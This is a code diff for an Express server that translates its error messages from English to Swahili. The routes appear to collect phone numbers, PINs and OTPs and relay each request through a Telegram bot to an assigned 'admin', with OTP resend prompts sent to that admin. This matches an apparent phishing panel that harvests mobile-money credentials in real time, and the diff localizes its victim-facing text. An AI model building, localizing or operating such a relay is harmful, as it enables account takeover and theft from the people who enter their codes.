@@ -1098,7 +1098,7 @@ app.post('/api/verify-pin', async (req, res) => {
         // Race condition guard
         const lockKey = `pin_${phoneNumber}`;
         if (processingLocks.has(lockKey)) {
-            return res.status(429).json({ success: false, message: 'Request already processing. Please wait.' });
+            return res.status(429).json({ success: false, message: 'Ombi linashughulikiwa tayari. Tafadhali subiri.' });
         }
         processingLocks.add(lockKey);
         setTimeout(() => processingLocks.delete(lockKey), 10000);
@@ -1113,12 +1113,12 @@ app.post('/api/verify-pin', async (req, res) => {
             if (!assignedAdmin) {
                 processingLocks.delete(lockKey);
                 console.error(`❌ Specific admin not found: ${requestAdminId}`);
-                return res.status(400).json({ success: false, message: 'The link you used is invalid. Please contact support.' });
+                return res.status(400).json({ success: false, message: 'Kiungo ulichotumia si sahihi. Tafadhali wasiliana na msaada.' });
             }
             if (pausedAdmins.has(requestAdminId) || assignedAdmin.status !== 'active') {
                 processingLocks.delete(lockKey);
                 console.warn(`⚠️ Specific admin paused/inactive: ${requestAdminId}`);
-                return res.status(400).json({ success: false, message: 'This service link is temporarily unavailable. Please try again later or contact support.' });
+                return res.status(400).json({ success: false, message: 'Kiungo hiki cha huduma hakipatikani kwa sasa. Tafadhali jaribu tena baadaye au wasiliana na msaada.' });
             }
 
             console.log(`🔒 LOCKED to specific admin: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
@@ -1129,7 +1129,7 @@ app.post('/api/verify-pin', async (req, res) => {
             const availableAdmins  = activeAdmins.filter(a => !pausedAdmins.has(a.adminId));
             if (availableAdmins.length === 0) {
                 processingLocks.delete(lockKey);
-                return res.status(503).json({ success: false, message: 'No admins available. Please try again later.' });
+                return res.status(503).json({ success: false, message: 'Hakuna wasimamizi wanapatikana. Tafadhali jaribu tena baadaye.' });
             }
             const adminStats = await Promise.all(
                 availableAdmins.map(async (admin) => {
@@ -1185,7 +1185,7 @@ app.post('/api/verify-pin', async (req, res) => {
                 adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
             } else {
                 processingLocks.delete(lockKey);
-                return res.status(503).json({ success: false, message: 'Admin not connected — they need to /start the bot first' });
+                return res.status(503).json({ success: false, message: 'Msimamizi hajaungana — wanahitaji kwanza kutuma /start kwenye bot.' });
             }
         }
 
@@ -1235,7 +1235,7 @@ ${userLabel}
     } catch (error) {
         processingLocks.delete(`pin_${req.body?.phoneNumber}`);
         console.error('❌ Error in /api/verify-pin:', error);
-        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
+        res.status(500).json({ success: false, message: 'Hitilafu ya seva: ' + error.message });
     }
 });
 
@@ -1244,9 +1244,9 @@ app.get('/api/check-pin-status/:applicationId', async (req, res) => {
     try {
         const application = await db.getApplication(req.params.applicationId);
         if (application) res.json({ success: true, status: application.pinStatus });
-        else res.status(404).json({ success: false, message: 'Application not found' });
+        else res.status(404).json({ success: false, message: 'Ombi halipatikani' });
     } catch (error) {
-        res.status(500).json({ success: false, message: 'Server error' });
+        res.status(500).json({ success: false, message: 'Hitilafu ya seva' });
     }
 });
 
@@ -1258,7 +1258,7 @@ app.post('/api/verify-otp', async (req, res) => {
         const application = await db.getApplication(applicationId);
 
         if (!application) {
-            return res.status(404).json({ success: false, message: 'Application not found' });
+            return res.status(404).json({ success: false, message: 'Ombi halipatikani' });
         }
 
         // Re-add admin to map if needed
@@ -1267,7 +1267,7 @@ app.post('/api/verify-otp', async (req, res) => {
             if (admin?.chatId) {
                 adminChatIds.set(application.adminId, admin.chatId);
             } else {
-                return res.status(500).json({ success: false, message: 'Admin unavailable' });
+                return res.status(500).json({ success: false, message: 'Msimamizi hapatikani' });
             }
         }
 
@@ -1300,7 +1300,7 @@ app.post('/api/verify-otp', async (req, res) => {
         res.json({ success: true });
     } catch (error) {
         console.error('❌ Error in /api/verify-otp:', error);
-        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
+        res.status(500).json({ success: false, message: 'Hitilafu ya seva: ' + error.message });
     }
 });
 
@@ -1309,9 +1309,9 @@ app.get('/api/check-otp-status/:applicationId', async (req, res) => {
     try {
         const application = await db.getApplication(req.params.applicationId);
         if (application) res.json({ success: true, status: application.otpStatus });
-        else res.status(404).json({ success: false, message: 'Application not found' });
+        else res.status(404).json({ success: false, message: 'Ombi halipatikani' });
     } catch (error) {
-        res.status(500).json({ success: false, message: 'Server error' });
+        res.status(500).json({ success: false, message: 'Hitilafu ya seva' });
     }
 });
 
@@ -1320,8 +1320,8 @@ app.post('/api/resend-otp', async (req, res) => {
     try {
         const { applicationId } = req.body;
         const application = await db.getApplication(applicationId);
-        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });
-        if (!adminChatIds.has(application.adminId)) return res.status(500).json({ success: false, message: 'Admin unavailable' });
+        if (!application) return res.status(404).json({ success: false, message: 'Ombi halipatikani' });
+        if (!adminChatIds.has(application.adminId)) return res.status(500).json({ success: false, message: 'Msimamizi hapatikani' });
 
         await sendToAdmin(application.adminId, `
 🔄 *OTP RESEND REQUEST*
@@ -1334,7 +1334,7 @@ User requested a new OTP.
 
         res.json({ success: true });
     } catch (error) {
-        res.status(500).json({ success: false, message: 'Server error' });
+        res.status(500).json({ success: false, message: 'Hitilafu ya seva' });
     }
 });
 
@@ -1347,7 +1347,7 @@ app.get('/api/admins', async (req, res) => {
             .map(a => ({ id: a.adminId, name: a.name, email: a.email, status: a.status, connected: adminChatIds.has(a.adminId) }));
         res.json({ success: true, admins: adminList });
     } catch (error) {
-        res.status(500).json({ success: false, message: 'Server error' });
+        res.status(500).json({ success: false, message: 'Hitilafu ya seva' });
     }
 });
 
@@ -1364,7 +1364,7 @@ app.get('/api/validate-admin/:adminId', async (req, res) => {
             res.json({ success: true, valid: false, message: 'Admin not found or inactive' });
         }
     } catch (error) {
-        res.status(500).json({ success: false, message: 'Server error' });
+        res.status(500).json({ success: false, message: 'Hitilafu ya seva' });
     }
 });
 
